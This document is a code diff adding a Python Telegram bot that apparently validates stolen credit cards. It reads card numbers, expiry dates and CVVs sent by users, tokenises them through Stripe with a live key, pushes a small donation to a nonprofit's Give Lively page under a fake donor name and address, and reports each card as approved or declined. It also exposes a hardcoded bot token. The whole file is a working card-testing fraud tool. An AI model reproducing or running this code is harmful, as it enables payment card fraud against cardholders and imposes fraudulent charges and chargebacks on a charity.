@@ -1,0 +1,176 @@
+import threading
+import requests
+import random
+
+import telebot
+
+bot = telebot.TeleBot("5407248182:AAF8VfF6zpXHC8BvonP7xKOm840ybjf-6cI")
+@bot.message_handler(commands=['start'])
+def start(message):
+    bot.reply_to(message,f"Lütfen Cc Gönderiniz!!")
+@bot.message_handler(func=lambda m:True)
+def d(message):
+    for i in range(1):
+        visa = message.text
+        num = visa.split("|")[0]
+        m = visa.split("|")[1]
+        y = visa.split("|")[2]
+        cvv = visa.split("|")[3]
+        try:
+            headers = {
+                'authority': 'api.stripe.com',
+                'accept': 'application/json',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
+            }
+
+            data = f'type=card&card[number]={num}&card[cvc]={cvv}&card[exp_month]={m}&card[exp_year]={y}&guid=8b05415f-dd3a-4443-ba86-ae10a73d74ea831882&muid=b0df3cb0-1060-4024-a93f-e513bb9a9285d259ee&sid=3a939761-c2e1-441f-aaf7-3e8e496a4605720144&pasted_fields=number&payment_user_agent=stripe.js%2Ff0346bf10%3B+stripe-js-v3%2Ff0346bf10&time_on_page=253157&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI'
+
+            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
+
+            id = response['id']
+            print(response)
+            print(f"[!] ID : {id}")
+
+            import requests
+
+            cookies = {
+                'datadome': 'FD8C8ew_~5zh3~ld0Z5coQiurm2Jro7O0XJbzab1nkD3RKdF88KLNXFt1GuuTxB_KSS4hJSz1VkkTZ5b-5dyKG01dr-T~RUJOlxQgNtfQp_xrCC6P5dn_5bYL2KHLO_',
+            }
+
+            headers = {
+                'authority': 'secure.givelively.org',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                # Already added when you pass json=
+                # 'content-type': 'application/json',
+                # 'cookie': 'datadome=FD8C8ew_~5zh3~ld0Z5coQiurm2Jro7O0XJbzab1nkD3RKdF88KLNXFt1GuuTxB_KSS4hJSz1VkkTZ5b-5dyKG01dr-T~RUJOlxQgNtfQp_xrCC6P5dn_5bYL2KHLO_',
+                'origin': 'https://secure.givelively.org',
+                'referer': 'https://secure.givelively.org/donate/1-for-the-planet?recurring=false&override_amount=5&dedication_name=&dedication_email=&dedication_type=&widget_type=simple_donation&widget_url=https%3A%2F%2Fwww.onepercentfortheplanet.org%2Fdonate&referrer_url=',
+                'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
+                'x-datadome-clientid': 'FD8C8ew_~5zh3~ld0Z5coQiurm2Jro7O0XJbzab1nkD3RKdF88KLNXFt1GuuTxB_KSS4hJSz1VkkTZ5b-5dyKG01dr-T~RUJOlxQgNtfQp_xrCC6P5dn_5bYL2KHLO_',
+            }
+
+            json_data = {
+                'auth_token': None,
+                'donation': {
+                    'user_email': 'trakodiaa11@gmail.com',
+                    'full_name': 'trakos diaa',
+                    'zip_code': None,
+                    'country': 'AR',
+                    'amount': 5.42,
+                    'stripe_token': f'{id}',
+                    'stripe_customer_id': None,
+                    'guidestar_identifier': '8357061',
+                    'recurring': False,
+                    'save_card': True,
+                    'share_details_opt_in': True,
+                    'private': False,
+                    'covering_transaction_fee': True,
+                    'transaction_fee': 0.42,
+                    'ref': None,
+                    'campaign': {},
+                    'nonprofit_name': '1% for the Planet',
+                    'utm_source': None,
+                    'activePaymentMethod': 'creditCard',
+                    'required_donatable_questions': [
+                        {
+                            'id': '87461116-5484-4167-8c36-5d09c147c8b4',
+                            'body': 'Mailing Address',
+                            'explanation': '',
+                            'required': True,
+                            'sort_order': 3,
+                            'answer_data_type': 'address',
+                            'input_type': None,
+                            'input': {
+                                'value': '02210',
+                                'state': 'IN_PROGRESS',
+                                'validity': True,
+                            },
+                            'address_attributes': {
+                                'administrative_area_level_1': {
+                                    'value': 'MA',
+                                    'state': 'IN_PROGRESS',
+                                    'validity': True,
+                                },
+                                'administrative_area_level_2': {
+                                    'value': 'Boston',
+                                    'state': 'IN_PROGRESS',
+                                    'validity': True,
+                                },
+                                'custom_field': {
+                                    'value': '',
+                                    'state': 'UNTOUCHED',
+                                    'validity': None,
+                                },
+                                'street_address': {
+                                    'value': '101 Seaport Blvd',
+                                    'state': 'IN_PROGRESS',
+                                    'validity': True,
+                                },
+                                'postal_code': {
+                                    'value': '02210',
+                                    'state': 'IN_PROGRESS',
+                                    'validity': True,
+                                },
+                            },
+                            'phone_attributes': {
+                                'number': {
+                                    'value': '',
+                                    'state': 'UNTOUCHED',
+                                    'validity': None,
+                                },
+                            },
+                            'organization_attributes': {
+                                'name': {
+                                    'value': '',
+                                    'state': 'UNTOUCHED',
+                                    'validity': None,
+                                },
+                            },
+                        },
+                    ],
+                    'optional_donatable_questions': [],
+                    'widget_type': 'simple_donation',
+                    'widget_url': 'https://www.onepercentfortheplanet.org/donate',
+                    'referrer_url': '',
+                    'ticket_order': None,
+                    'idempotency_key': 'f60aa69a-0f0e-4673-a6b6-3386caa948d9',
+                    'event_id': None,
+                    'page_type': 'nonprofit',
+                    'team_id': None,
+                    'dedication_attributes': {
+                        'type': '',
+                        'name': '',
+                        'email': '',
+                    },
+                    'use_saved_card': False,
+                },
+                'slug': '1-for-the-planet',
+            }
+
+            responsee = requests.post('https://secure.givelively.org/donate.json', cookies=cookies, headers=headers,
+                                      json=json_data).text
+            print(responsee)
+            if "The card was declined." in responsee:
+                bot.send_message(message.chat.id,f"❌ Bad Visa  :  {num}|{m}|{y}|{cvv}")
+            else:
+                bot.send_message(message.chat.id,f"✅ Approved CC : {message.text}\nCharge : 4.99$ !")
+        except:
+            continue
+bot.infinity_polling()
